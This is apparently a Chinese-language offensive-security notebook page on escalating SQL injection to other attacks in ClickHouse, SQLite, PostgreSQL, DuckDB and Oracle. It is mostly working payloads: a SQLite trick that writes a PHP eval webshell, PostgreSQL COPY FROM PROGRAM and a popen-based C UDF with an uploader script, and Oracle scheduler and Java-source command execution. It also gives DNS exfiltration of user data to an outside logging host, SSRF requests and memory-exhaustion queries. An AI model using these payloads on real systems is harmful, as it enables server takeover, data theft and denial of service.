---
title: sql2other
pubDatetime: 2025-01-20T00:00:00.000+08:00
description: 从SQL注入到RCE、文件读写等的手段
tags:
  - sql2other
---

## sink
execute, executemany
executescript(sqlite)

## bigquery

https://blog.wjlin0.com/docs/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/bigquery/

## snowflake

云数据库 docker隔离
https://medium.com/snowflake/snowpark-protection-through-java-scala-and-python-isolation-f8d10be61d56

## clickhouse
没显示版本号
一次只能执行一条
默认情况下default用户禁止远程连接 https://clickhouse.com/docs/install/docker#configuration
```sh
docker run --rm \
 -e CLICKHOUSE_DB=my_database \ 
 -e CLICKHOUSE_USER=default \ 
 -e CLICKHOUSE_DEFAULT_ACCESS_MANAGEMENT=1 \
 -e CLICKHOUSE_PASSWORD=changeme \ 
 -p 8123:8123 \ 
 clickhouse/clickhouse-server
# 需要设置CLICKHOUSE_DEFAULT_ACCESS_MANAGEMENT，并设置密码
```

https://xz.aliyun.com/news/17625
### rce

可以执行`/var/lib/clickhouse/user_scripts`目录的脚本
```sql
SELECT * FROM executable('1.py', TabSeparated, 'id UInt32, random String', (SELECT 10))
```
其中TabSeparated表示脚本文件的输出每行以\t符号分隔，用于解析结果，可以换成TSV
如果脚本文件的输出以逗号结尾，那么就写CSV
最后一个参数要传入一个query语句，结果会被传入脚本文件的标准输入
用什么解释器执行脚本，取决于文件开头的注释`#!/`
当尝试跨目录执行文件时，报错
### 写文件
**远程**默认不开启into outfile
```sql
select 1,2,3 union all select 123,4556,789 into outfile '/tmp/1.txt';
```

### 读文件

按照一定的格式读取文件，要求文件的路径在user_files下
```sql
SELECT * FROM file('1.txt', 'CSV', 'column1 UInt32, column2 UInt32, column3 UInt32');
```
### ssrf
需要以下两个权限
`GRANT CREATE TEMPORARY TABLE ON *.* TO CURRENT_USER;`
`GRANT READ ON URL TO CURRENT_USER;`
默认可以使用
```
select * from url('https://ywwk2x.dnslog.cn', CSV, 'column1 String, column2 UInt32')
```
通过SSRF证明内网连通性以及访问元数据相关的危害不多做说明，大家需要注意点到为止即可。我补充下敏感数据层面的深入利用：

Clickhouse有很多system表，具体信息可以参考下官方的文档： https://clickhouse.com/docs/en/sql-reference
其中system.clusters表个人认为比较关键，因为在SRC漏洞挖掘中，可以将一枚中高危的sql注入漏洞提升到严重危害：

**system.clusters表，存储数据库集群的节点信息，可以通过相关查询控制数据库集群权限。**

大概思路就是：先通过查询system.clusters表获取数据库集群的ip信息，再利用clickouse默认会使用一个组件导致会开启8123或者8124端口的特性，从而可以去未授权查询数据库集群里面的所有数据信息：

```
select * from system.clusters 返回数据库集群ip以及端口开放情况SELECT * from url(http:/192.168.1.1:8123?guery=show tables',CSV,'column1 String') 利用8123或者8124端口，通过query后拼接sql语句未授权查询数据库信息（理论上是DBA权限）
```

### DoS
```sql
SELECT repeat('A', 10000) FROM numbers(1000000);
```

## sqlite
一次执行一条语句

### 写文件

```python
import sqlite3

db = sqlite3.connect("test.db")

db.execute("ATTACH DATABASE '/var/www/html/shell.php' AS shell;")
db.execute("create TABLE shell.exp (payload text);")
db.execute("insert INTO shell.exp (payload) VALUES ('<?php @eval($_POST[0]); ?>');")
db.execute("insert INTO shell.exp (payload) VALUES (x'61626364656667')") ## 按十六进制写
db.commit()
```

### DOS
利用CTE递归+笛卡尔积（并行），仅fetchall时可用
```sql
WITH RECURSIVE test(x) AS (
    SELECT 1 UNION ALL SELECT x + 1 FROM test WHERE x < 1000
)
SELECT quote(hex(zeroblob(1000000))) FROM test t1, test t2;
```

可以用递归10次的做测试
```sql
WITH RECURSIVE infinite_loop(x, depth) AS (
  SELECT 1, 1
  UNION ALL
  SELECT x + 1, depth + 1 FROM infinite_loop WHERE depth < 10
)
SELECT x FROM infinite_loop;
```


### load_extension RCE

需要手动开启功能权限，且能上传.so文件，很少见

官方有fileio扩展，需要手动编译启用

  
## postgres
一次可以执行多条语句
postgresql://postgres:pass@localhost:5432/postgres
```sh
docker run -d   --name my_postgres   -e POSTGRES_PASSWORD=pass  -p 5432:5432   --memory="1g"   -
-memory-reservation="1g"   --cpus="1"   postgres -c listen_addresses='*'
```

### RCE
#### program
postgres>=9.3
superuser权限

```sql
DROP TABLE IF EXISTS log;
CREATE TABLE log(content text);
COPY log(content) FROM PROGRAM 'id';
SELECT * FROM log;
```
或
```sql
copy (select '') to program 'id>/tmp/res';
```

#### 语言插件
大概率是没有的

比如在装了plpythonu插件的情况下，可以执行python代码
```
CREATE OR REPLACE FUNCTION exec (cmd text)
RETURNS VARCHAR(65535) stable
AS $$
import os
return os.popen(cmd).read()
$$
LANGUAGE 'plpythonu';

SELECT cmd("ls"); #RCE with popen or execve
```
#### UDF

8.1版本以前，可以直接使用/lib/x86_64-linux-gnu/libc.so.6导入system函数
```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd');
```

以后，需要上传带PG_MODULE_MAGIC的so文件

```c
#include "postgres.h"
#include "fmgr.h"
#include "utils/builtins.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
PG_MODULE_MAGIC;
Datum testf(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(testf);
Datum
testf(PG_FUNCTION_ARGS)
{
    
    if (PG_ARGISNULL(0)) {
        ereport(ERROR, (errmsg("The command argument cannot be NULL")));
    }
    
    text *command_text = PG_GETARG_TEXT_P(0);
    char *command = text_to_cstring(command_text);

    FILE *fp;
    char result[1024];
    char *output = malloc(1);  
    output[0] = '\0';  
    fp = popen(command, "r");
    if (fp == NULL) {
        ereport(ERROR, (errmsg("Failed to run command: %s", command)));
    }
    
    while (fgets(result, sizeof(result) - 1, fp) != NULL) {
        size_t len = strlen(output) + strlen(result) + 1;
        output = realloc(output, len);
        strcat(output, result);
    }
    
    pclose(fp);
    
    text *result_text = cstring_to_text(output);
    free(output);  
    PG_RETURN_TEXT_P(result_text);
}
```

编译，头文件版本必须和目标一样

```bash
gcc -Wall -I/usr/include/postgresql/16/server -Os -shared testp.c -fPIC -o testp.so
```

利用large object上传 .so文件

然后创建函数，如

```sql
-- USAGE on language 权限
CREATE FUNCTION testf(command text) RETURNS text
    AS '/tmp/testp.so', 'testf'
    LANGUAGE C STRICT;
```

执行命令

```bash
select testf('cat /etc/passwd');
```

从.so文件到sql语句的脚本

```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from random import randint
import os

number = randint(1000, 9999)
hexfile = "1.txt"
outfile = "sqlcmd.txt"

if __name__ == "__main__":
    os.system("strip -sx testp.so") # 去除符号表？更短点
    os.system(f'cat testp.so | xxd -ps | tr -d "\\n" > {hexfile}')
    
    with open(hexfile, 'rb') as fileobj, open(outfile, "w") as out:
        i = 0
        t = -1
        s = ''
        out.write(f'SELECT lo_create({number});\n')

        for b in fileobj.read():
            i += 1
            s += chr(b)

            if i % 4096 == 0:
                t += 1
                out.write(f"insert into pg_largeobject values ({number}, {t}, decode('{s}', 'hex'));\n")
                s = ''
        
        t += 1
        
        out.write(f"insert into pg_largeobject values ({number}, {t}, decode('{s}', 'hex'));\n")
        out.write(f"SELECT lo_export({number}, '/tmp/testp.so');\n")
        out.write(f"CREATE FUNCTION testf(command text) RETURNS text AS '/tmp/testp.so', 'testf' LANGUAGE C STRICT;\n")
        out.write(f"select testf('id');")
```

可以用base64编码优化一下（更短），其中有很多连续的A，可以用`repeat('A', 2273)`再缩短

### 读写文件

#### copy
适合文本文件

读取，需要pg_read_server_files权限

```sql
create table test(data text);
copy test(data) from '/etc/passwd' with delimiter E'\x7f';
select * from test;
```

写入，需要pg_write_server_files权限

```sql
copy (select 'abc') to '/tmp/abc.txt'; 
```

#### adminpack

需要管理员权限

```sql
select pg_read_file('/tmp/abc.txt');
select pg_ls_dir('/');
-- write需要加载adminpack插件
CREATE EXTENSION IF NOT EXISTS adminpack;
SELECT pg_file_write('/tmp/example.txt', 'Hello', true);
```

#### large object

也需要管理员权限或对某个大对象的权限

读

```sql
select lo_import('/tmp/abc.txt', 2222);
select lo_get(2222);
```

写

```sql
select lo_from_bytea(3333, decode('aGVsbG8=','base64'));
select lo_from_bytea(9999, lo_get(3333) || lo_get(3333)); -- 可以拼接多个
select lo_export(9999,'/tmp/res');
```

#### file_fdw插件
```sql
CREATE EXTENSION file_fdw;
CREATE SERVER file_server FOREIGN DATA WRAPPER file_fdw;
create foreign table test(data text) server file_server options (filename '/etc/passwd', format 'text');
select * from test;
```

### SSRF
(在windows上同样可以用UNC路径，同mysql和mssql)

加载dblink插件，可以做端口扫描

```sql
CREATE EXTENSION dblink; -- superuser
SELECT * FROM dblink_connect('host=216.58.212.238 port=443 user=name password=secret dbname=abc connect_timeout=10'); -- 不需要权限
-- dblink_connect_u 需要权限
```
不同响应类型：
```
// Port closed
RROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
Is the server running on host "127.0.0.1" and accepting
TCP/IP connections on port 4444?

// Port Filtered/Timeout
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTP server
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTPS server
ERROR:  could not establish connection
DETAIL:  received invalid response to SSL negotiation:
```

dblink同时可以连接其他数据库：
```sql
SELECT * FROM dblink('host=127.0.0.1 user=postgres dbname=postgres', 'SELECT datname FROM pg_database') RETURNS (result TEXT);
```
在低版本postgresql配置如果为本地无需密码连接，可能造成权限提升


### DoS
无权限要求

```sql
WITH RECURSIVE memory_hog(x, data) AS (
    SELECT 1, repeat('A', 1000)
    UNION ALL
    SELECT x + 1, repeat('A', 1000) FROM memory_hog
)
SELECT x FROM memory_hog;

-- 这个更猛
SELECT repeat('A', 1024) 
FROM generate_series(1, 1000) t1, 
     generate_series(1, 1000) t2, 
     generate_series(1, 1000) t3;
```

在python中远程执行上面的SQL，postgres服务器没有DoS，但是python中由于cursor.fetchall()内容不断增加导致OOM
![](assets/sql2other/Pasted%20image%2020260204121030.png)


## Duckdb
一次可以执行多条语句。默认无权限控制


### 写文件

```bash
COPY (SELECT 'abc') TO '/tmp/res' WITH (HEADER false);
```
或通过attach（退出前内容在testdb.wal）
```sql
attach '/home/mekrina/testdb' as db;
create table db.testtb(line varchar);
insert into db.testtb values('<?=system("ls");?>');
```

### 读文件

read_csv或read_text
```sql
SELECT * FROM read_csv('/etc/passwd');
```
或使用copy from
```sql
COPY testtb FROM '/etc/passwd' (DELIMITER ',');
select * from testtb;
```

### SSRF

同样用read_csv，可以发GET请求

```sql
SELECT * FROM read_csv('http://127.0.0.1:5000/')
```

### RCE

默认情况下是可以加载社区插件的

```sql
install shellfs from community;
load shellfs;
select * from read_csv_auto('id|',HEADER=false, sep='');
```

### DoS
```sql
SELECT repeat('A', 1024*1024) FROM range(100000000);
```

### 启用权限控制
```sql
SET disabled_filesystems = 'LocalFileSystem'; -- 完全禁用文件系统，同时也无法下载或启用扩展
SET allowed_directories = ['/tmp'];
SET allow_community_extensions = false ; -- 禁用社区扩展
SET enable_external_access = false -- 禁止外部资源，如文件、扩展
```

## Oracle
一次只能执行一条
### 环境
```yml
version: '3.8'
services:
  oracle21c:
    image: gvenzl/oracle-xe:21-slim-faststart
    container_name: oracle_21_vuln
    ports:
      - "1521:1521"
    environment:
      # 设置 SYSTEM 用户的密码
      - ORACLE_PASSWORD=SecretPassword123
      # 允许随机密码（这里为了方便复现固定了密码，所以注释掉）
      # - ORACLE_RANDOM_PASSWORD=yes
    restart: unless-stopped
```

连接环境
```
pip install oracledb
```

连接驱动
+ Oracle 数据库版本 12.1 及以上, 使用python-oracledb, 默认使用 "Thin" 模式
+ 以下: 需要配置 "Thick" 模式, 这需要安装 Oracle Instant Client。

```python
import oracledb

# ================= 配置区 =================
# Thin 模式不需要 lib_dir！也不需要安装客户端！
DB_CONFIG = {
    "user": "system",
    "password": "SecretPassword123",  # 对应 docker-compose 里的密码
    "dsn": "192.168.126.114:1521/XE"        # 21c XE 默认服务名也是 XE
}
# =========================================

def vulnerable_demo():
    print("[*] 正在通过 Thin 模式连接 Oracle 21c...")
    
    try:
        # 核心：默认为 Thin 模式，直接连接，无比丝滑
        with oracledb.connect(**DB_CONFIG) as conn:
            print(f"[+] 连接成功! 数据库版本: {conn.version}")
            
            cursor = conn.cursor()
            sql = f"SELECT role FROM session_roles"
            cursor.execute(sql)
            results = cursor.fetchall()
            print(results)

    except oracledb.Error as e:
        print(f"[-] 发生错误: {e}")

if __name__ == "__main__":
    vulnerable_demo()
```

### 基础SQL

对于“数据库”这个概念而言，Oracle采用了”表空间“的定义。数据文件就是由多个表空间组成的，这些数据文件和相关文件形成一个完整的数据库。当数据库创建时，Oracle 会默认创建五个表空间：SYSTEM、SYSAUX、USERS、UNDOTBS、TEMP：

1. SYSTEM：看名字就知道这个用于是存储系统表和管理配置等基本信息
2. SYSAUX：类似于 SYSTEM，主要存放一些系统附加信息，以便减轻 SYSTEM 的空间负担
3. UNDOTBS：用于事务回退等
4. TEMP：作为缓存空间减少内存负担
5. USERS：就是存储我们定义的表和数据

在Oracle中每个表空间中均存在一张dual表，这个表是虚表，并没有实际的存储意义，它永远只存储一条数据，**因为Oracle的SQL语法要求select后必须跟上from**，所以我们通常使用dual来作为计算、查询时间等SQL语句中from之后的虚表占位，也就是`select 1+1 from dual`。

```
//注释符 多行注释:/**/,单行注释:--
```

1.dual表
此表是Oracle数据库中的一个自带表，有说法这是一个虚拟表，也有的说是一个实表，它实际上位满足查询条件而产生。
与MySQL不同的是，在MySQL中查询语句可以直接是：select 1,2，但是在Oracle中就必须跟一个表名，如下：select * from dual

2.基本用法
```sql
select * from all_tables 查询出所有的表
select * from user_tables 查询出当前用户的表
select * from all_tab_columns 查询出所有的字段
select * from user_tab_columns  查询出当前用户的字段
select * from v$version 查版本
```
![](assets/sql2other/file-20260116151637685.png)

3.rownum=1   (限制查询返回的总行数为一条)
对于rownum来说它是oracle系统顺序分配为从查询返回的行的编号，返回的第一行分配的是1，第二行是2，依此类推，这个伪字段可以用于限制查询返回的总行数。 
我们可以用`where rownum<3`来要求他输出2条数据

![](assets/sql2other/file-20260116151833037.png)

### 信息搜集

获取数据库版本信息
```sql
http://localhost:8080/oracleInject/index?username=admin' union select 1,'a',(SELECT banner FROM v$version WHERE banner LIKE 'Oracle%25') from dual -- +
```
获取操作系统版本信息

```sql
http://localhost:8080/oracleInject/index?username=admin' union select 1,'a',(SELECT banner FROM v$version where banner like 'TNS%25') from dual -- +
```

获取当前数据库

```
http://localhost:8080/oracleInject/index?username=admin' union select 1,'a',(SELECT name FROM v$database) from dual -- +
```

获取数据库用户

```
SELECT user FROM dual;
```

获取所有数据库用户

```
SELECT username FROM all_users;
SELECT name FROM sys.user$; -- 需要高权限
```

获取当前用户权限

```
SELECT * FROM session_privs
```

获取当前用户有权限的所有数据库

```
SELECT DISTINCT owner, table_name FROM all_tables
```

获取表，all_tables类似于MySQL中的information_schema.tables，里面的结构可以自己构造sql语句。

```
SELECT * FROM all_tables;
```

获取字段名
```
SELECT column_name FROM all_tab_columns
```

在Oracle启动时，在 userenv 中存储了一些系统上下文信息，通过 SYS_CONTEXT 函数，我们可以取回相应的参数值。包括当前用户名等等。

```
SELECT SYS_CONTEXT（'USERENV'，'SESSION_USER'） from dual;
```

更多可用参数说明可以查阅 Oracle 提供的文档：[SYS_CONTEXT](https://docs.oracle.com/cd/B19306_01/server.102/b14200/functions165.htm)

### 权限识别
再来看Oracle中用户和权限划分：Oracle 中划分了许多用户权限，权限的集合称为角色。例如 CONNECT 角色具有连接到数据库权限，RESOURCE 能进行基本的增删改查，DBA 则集合了所有的用户权限。在创建数据库时，会默认启用 sys、system 等用户：

1. sys：相当于 Linux 下的 root 用户。为 DBA 角色
2. system：与 sys 类似，但是相对于 sys 用户，无法修改一些关键的系统数据，这些数据维持着数据库的正常运行。为 DBA 角色。
3. public：public 代指所有用户（everyone），对其操作会应用到所有用户上（实际上是所有用户都有 public 用户拥有的权限，如果将 DBA 权限给了 public，那么也就意味着所有用户都有了 DBA 权限）

在 21c XE 中，数据库被分成了两层，这直接影响权限：

- **CDB (Container Database, 根容器):**
    - 名字通常叫 `CDB$ROOT`。
    - **权限特点：** 这里的用户叫“公用用户”（Common User），名字必须以 **`C##`** 开头（例如 `C##ADMIN`）。
    - **用途：** 仅用于管理数据库实例，**不建议存放业务数据**。
    - _坑点：_ 如果你在这里直接 `create user hacker ...`，会报错 `ORA-65096: invalid common user or role name`。
        
- **PDB (Pluggable Database, 插拔数据库):**
    - 21c XE 默认带一个 PDB，名字通常叫 **`XEPDB1`**。
    - **权限特点：** 这里的用户叫“本地用户”（Local User），名字**不需要** `C##` 前缀（例如 `hacker`）。
    - **用途：** **这是你做复现、存数据的地方**。


+ A. “我是谁” (当前会话身份)

最基础的一步。

- **Payload:** `SELECT user FROM dual`
- **Payload:** `SELECT sys_context('USERENV', 'CURRENT_USER') FROM dual`
- **判断逻辑:** 如果返回 `SYSTEM` 或 `SYS`，直接就是最高权限。如果返回 `C##` 开头的用户，说明你在 CDB 根容器（很少见，但权限通常很高）。

+ B. “我有令箭吗” (查看激活的角色)
Oracle 的权限通常打包在 Role 中，查看 `SESSION_ROLES` 视图是最直接的
- **Payload:** `SELECT role FROM session_roles`
- **关键目标:**
    - **`DBA`**: 看到这个字样，直接满级神装（拥有几乎所有权限）。
    - **`SELECT_CATALOG_ROLE`**: 虽不是 DBA，但能查看所有数据字典（即能看到所有表结构、用户Hash等）。
    - **`RESOURCE`**: 普通开发权限。
        

+ C. “我有上帝视角吗” (视图访问测试)
这是最实用的物理检测。Oracle 的数据字典分为三级，通过尝试查询不同的视图前缀，能精准定位权限：

1. **`USER_xxxx`** (最低): 只能看自己的。
2. **`ALL_xxxx`** (中等): 能看自己有权限访问的（普通用户水平）。
3. **`DBA_xxxx`** (最高): 能看全库所有人的（管理员水平）。
    

- **测试 Payload:** `SELECT count(*) FROM DBA_USERS`
    - **成功:** 说明有 `SELECT ANY DICTIONARY` 系统权限或 `DBA` 角色。**这是高权限的铁证**。
    - **报错 (Table or view does not exist):** 说明只是普通用户，被关在笼子里。


+ D. “我在哪” (环境探测)

在 21c 中，确认自己是在 PDB 还是 CDB 很重要。
- **Payload:** `SELECT sys_context('USERENV', 'CON_NAME') FROM dual`
    - 返回 `CDB$ROOT`: 根容器（危险，涉及整个实例）。
    - 返回 `XEPDB1`: 业务数据库（通常情况）。


### SSRF&DNS
DBMS_NETWORK_ACL_ADMIN权限

```sql
SELECT UTL_HTTP.REQUEST('https://webhook.site/5a1724ff-ee18-4092-8711-078892378f7c?a=1') FROM dual
```
直接用UTL_HTTP会报错
![](assets/sql2other/file-20260116152504150.png)

要先创建ACL规则然后请求
```sql
--- 创建ACL
    BEGIN
        -- 1. 清理旧规则
        BEGIN
            DBMS_NETWORK_ACL_ADMIN.DROP_ACL(acl => 'hack.xml');
        EXCEPTION
            WHEN OTHERS THEN NULL;
        END;

        -- 2. 创建 ACL
        DBMS_NETWORK_ACL_ADMIN.CREATE_ACL(
            acl         => 'hack.xml',
            description => 'Allow All Network Access',
            principal   => 'SYSTEM',   -- <--- 改为当前用户 SYSTEM
            is_grant    => TRUE,
            privilege   => 'connect'
        );

        -- 3. 追加 resolve 权限
        DBMS_NETWORK_ACL_ADMIN.ADD_PRIVILEGE(
            acl       => 'hack.xml',
            principal => 'SYSTEM',     -- <--- 改为当前用户 SYSTEM
            is_grant  => TRUE,
            privilege => 'resolve'
        );

        -- 4. 开放给所有 IP
        DBMS_NETWORK_ACL_ADMIN.ASSIGN_ACL(
            acl  => 'hack.xml',
            host => '*'
        );
        
        COMMIT;
    END;
```

```sql
SELECT UTL_HTTP.REQUEST('http://115.29.241.139:8001/aab?a=1') FROM dual
```

另外还有一个HTTPS 证书问题: Oracle 数据库原生不支持直接访问 HTTPS，除非配置 Oracle Wallet（证书库

DNS每次请求也需要加上上述ACL配置
```sql
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT 11 FROM dual)||'.56v13fpu.eyes.sh') FROM dual
```

![](assets/sql2other/file-20260116154651037.png)

带数据

```sql
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT RAWTOHEX(username || '|' || account_status) FROM dba_users OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)||'.56v13fpu.eyes.sh') FROM dual
```

- **拼接列：** `username || '|' || account_status`
- **Hex 编码：** 使用 `RAWTOHEX()` 变成 `737973...` 这种纯数字字母格式，确保 DNS 协议允许。
- **取第一行：** 使用 `OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY` (Oracle 12c+ 语法) 或 `rownum=1`(之前说过)
- **发起请求：** `UTL_INADDR.GET_HOST_ADDRESS( 编码数据 || '.你的域名')`

类似的方法还有，同样需要先创建ACL规则
```sql
SELECT DBMS_LDAP.INIT('192.168.50.1',9299) FROM dual; 
-- 端口探测、域名解析

DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('192.168.50.1',9999,2);
END;
 -- 端口没开放 SMTP transient error: 421 Service not available 
 -- 端口开放 transfer timeout
 
 select HTTPURITYPE('http://192.168.50.1:9999').getclob() from dual;
```

这个可以往tcp连接里面写任意内容，比如发GET、POST请求
```sql
set serveroutput on size 30000;
SET SERVEROUTPUT ON 
DECLARE c utl_tcp.connection;
  retval pls_integer; 
BEGIN
  c := utl_tcp.open_connection('192.168.50.1',9999,tx_timeout => 2);
  retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
  retval := utl_tcp.write_line(c);
  BEGIN
    LOOP
      dbms_output.put_line(utl_tcp.get_line(c, TRUE));
    END LOOP;
  EXCEPTION
    WHEN utl_tcp.end_of_input THEN
      NULL;
  END;
  utl_tcp.close_connection(c);
END
```


### 文件读取
- Oracle **不能**直接使用绝对路径（如 `/etc/passwd` 或 `C:\Windows\win.ini`）。
- **限制**：必须先创建一个逻辑对象（Directory Object）映射到物理路径，然后通过这个对象名来访问文件。

在 SQL 注入中，我们通常只能控制 `SELECT` 语句。
1. 黄金方案：`DBMS_XSLPROCESSOR.READ2CLOB`

这是目前唯一能在纯 `SELECT` 语句中稳定使用的函数。
- **适用场景**：普通 `UNION SELECT` 注入（无需堆叠注入）。
- **优点**：是**函数 (Function)**，有返回值；内部自动处理文件打开/关闭，避开 `ORA-22289` 错误。

```sql
	-- 需要创建目录权限 GRANT CREATE ANY DIRECTORY TO MEKRINA;
	-- 或拥有某个目录下的读权限(只能读目录下的) GRANT read on directory ROOT_DIR to MEKRINA
    CREATE OR REPLACE DIRECTORY ROOT_DIR AS '/etc'
    SELECT DBMS_XSLPROCESSOR.READ2CLOB('ROOT_DIR', 'passwd'), 0 FROM dual
```

2. 备选方案：`XMLType`
- **适用场景**：目标文件必须是合法的 XML 格式（如 `web.xml`, `config.xml`）。
- **缺点**：如果读取非 XML 文件（如 `/etc/passwd`），会报错 `XML parsing failed`，无法获取内容。
- **利用 Payload**：

```sql
SELECT XMLType(BFILENAME('ROOT_DIR', 'config.xml')).getCLOBVal(), NULL FROM dual -- 似乎不可用
-- https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/XMLTYPE.html#GUID-59081026-A42A-4352-B5EA-A6E433A51F5E
```

2. 陷阱方案：`DBMS_LOB` / `UTL_FILE`
- **为什么不行**：这些包的核心操作（如 `FILEOPEN`, `GET_LINE`）是**存储过程 (Procedure)**，不能在 `SELECT` 语句中直接调用。
- **例外**：旧版本 Oracle 可能允许 `DBMS_LOB.SUBSTR(BFILENAME(...))` 直接读取，但在 21c 中通常会报 `ORA-22289`（文件未打开）。

### 文件写入

```sql
-- 同读取，需要CREATE ANY DIRECTORY权限
-- 或拥有某个目录对象的写权限
CREATE OR REPLACE DIRECTORY ROOT_DIR AS '/tmp'
BEGIN DBMS_XSLPROCESSOR.CLOB2FILE(TO_CLOB('123'), 'ROOT_DIR', 'shell.php'); END;
```

### DoS
0权限
OOM比较慢，仅在fetchall()的时候内存消耗会逐渐增加
```sql
SELECT RPAD('A', 10000, 'A') 
FROM (SELECT LEVEL FROM DUAL CONNECT BY LEVEL <= 1000) t1,
	(SELECT LEVEL FROM DUAL CONNECT BY LEVEL <= 1000) t2,
	(SELECT LEVEL FROM DUAL CONNECT BY LEVEL <= 1000) t3,
	(SELECT LEVEL FROM DUAL CONNECT BY LEVEL <= 1000) t4,
	(SELECT LEVEL FROM DUAL CONNECT BY LEVEL <= 1000) t5,
	(SELECT LEVEL FROM DUAL CONNECT BY LEVEL <= 1000) t6
```
### RCE
#### 调度器
一种是利用调度器执行 OS 命令

```sql
-- 需要以下三条权限
-- GRANT CREATE EXTERNAL JOB TO MEKRINA;
-- GRANT MANAGE SCHEDULER TO MEKRINA;
-- GRANT EXECUTE ON DBMS_SCHEDULER TO MEKRINA;
 BEGIN
	-- 1. 如果任务已存在，先强制删除
	BEGIN
		DBMS_SCHEDULER.DROP_JOB(job_name => 'demo', force => TRUE);
	EXCEPTION
		WHEN OTHERS THEN NULL;
	END;

	-- 2. 创建任务
	DBMS_SCHEDULER.CREATE_JOB(
		job_name   => 'demo',
		job_type   => 'EXECUTABLE',
		job_action => '/bin/sh',     -- 调用的程序
		number_of_arguments => 2,    -- 参数数量 (-c 和 命令)
		start_date => SYSTIMESTAMP,
		enabled    => FALSE          -- 先不启用，等设好参数
	);

	-- 3. 设置参数 1: -c
	DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE(
		job_name          => 'demo',
		argument_position => 1,
		argument_value    => '-c'
	);

	DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE(
		job_name          => 'demo',
		argument_position => 2,
		argument_value    => '/usr/bin/id > /tmp/res'
	);

	-- 5. 启用
	DBMS_SCHEDULER.ENABLE('demo');

	-- 注意: SCHEDULER 是异步的，执行完 SQL 后，OS 层面可能还在跑
	COMMIT;
END;
/
```

#### Java Source
需要在oracle中下载javavm组件，docker中默认没有
```sql
-- 1. 创建一个 Java Source (执行命令的类)
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "CmdExec" AS
import java.io.*;
public class CmdExec {
    public static String run(String cmd) {
        try {
            StringBuffer output = new StringBuffer();
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = "";
            while ((line = reader.readLine())!= null) {
                output.append(line + "\n");
            }
            return output.toString();
        } catch (Exception e) {
            return e.toString();
        }
    }
}
/

-- 2. 创建一个 PL/SQL 函数来包装这个 Java 类
CREATE OR REPLACE FUNCTION sys_run_cmd(p_cmd IN VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA NAME 'CmdExec.run(java.lang.String) return java.lang.String';
/

-- 3. 赋予权限 (关键步骤，Oracle 21c 默认禁止 Java 调 Shell)
BEGIN
    DBMS_JAVA.GRANT_PERMISSION( 'SYSTEM', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute' );
    DBMS_JAVA.GRANT_PERMISSION( 'SYSTEM', 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '' );
    DBMS_JAVA.GRANT_PERMISSION( 'SYSTEM', 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '' );
    COMMIT;
END;
/

-- 4. 直接执行命令！(带回显)
SELECT sys_run_cmd('/usr/bin/id') FROM dual;
```


| **攻击方式**       | **核心依赖组件**                                        | **第一道门 (组件执行权)**                             | **第二道门 (资源访问权)**                                         | **普通用户现状**                                              | **想要利用需管理员做什么?**                             |
| -------------- | ------------------------------------------------- | -------------------------------------------- | -------------------------------------------------------- | ------------------------------------------------------- | -------------------------------------------- |
| **文件读取**       | `DBMS_XSLPROCESSOR`<br><br>  <br><br>`.READ2CLOB` | ✅ **开**<br><br>  <br><br>(PUBLIC 可调用)        | ❌ **关**<br><br>  <br><br>(需 Directory Object 的 READ 权限)  | **有枪无弹**<br><br>  <br><br>能调函数，但看不到目录，读不了文件。            | `GRANT READ ON DIRECTORY xxx TO public/user` |
| **文件写入**       | `DBMS_XSLPROCESSOR`<br><br>  <br><br>`.CLOB2FILE` | ✅ **开**<br><br>  <br><br>(PUBLIC 可调用)        | ❌ **关**<br><br>  <br><br>(需 Directory Object 的 WRITE 权限) | **有枪无弹**<br><br>  <br><br>没有目录的写权限，绝对写不进去。              | `GRANT WRITE ON DIRECTORY ...` (极少见)         |
| **SSRF / OOB** | `UTL_HTTP`<br><br>  <br><br>`UTL_INADDR`          | ✅ **开**<br><br>  <br><br>(通常 PUBLIC 可调用)     | ❌ **关**<br><br>  <br><br>(受 **ACL** 网络访问控制列表限制)          | **断网状态**<br><br>  <br><br>函数能跑，但发包时会被内核拦截 (ACL Denied)。 | 配置 ACL (Access Control List) 允许该用户连外网。       |
| **RCE**        | `DBMS_SCHEDULER`<br><br>  <br><br>`CREATE_JOB`    | ❌ **关**<br><br>  <br><br>(需 `CREATE JOB` 权限) | ❌ **关**<br><br>  <br><br>(需 `CREATE EXTERNAL JOB` 权限)    | **彻底没戏**<br><br>  <br><br>既建不了任务，也无权执行 OS 命令。           | `GRANT CREATE EXTERNAL JOB TO user` (这是送命题)  |

### 总结
+ 凡是要用到`create`的, 都不是普通数据库权限可以达到的 
	+ 因为`CREATE DIRECTORY` 是一个 **DDL (数据定义语言)** 操作，而且是系统级的对象操作。 必须拥有 **`CREATE ANY DIRECTORY`** 系统权限。
+ 不能堆叠注入，一次只能执行一条

![](assets/sql2other/file-20260118120231494.png)

有关Oracle注入
[Oracle SQL注入学习 - Y4er的博客](https://y4er.com/posts/oracle-sql-inject)
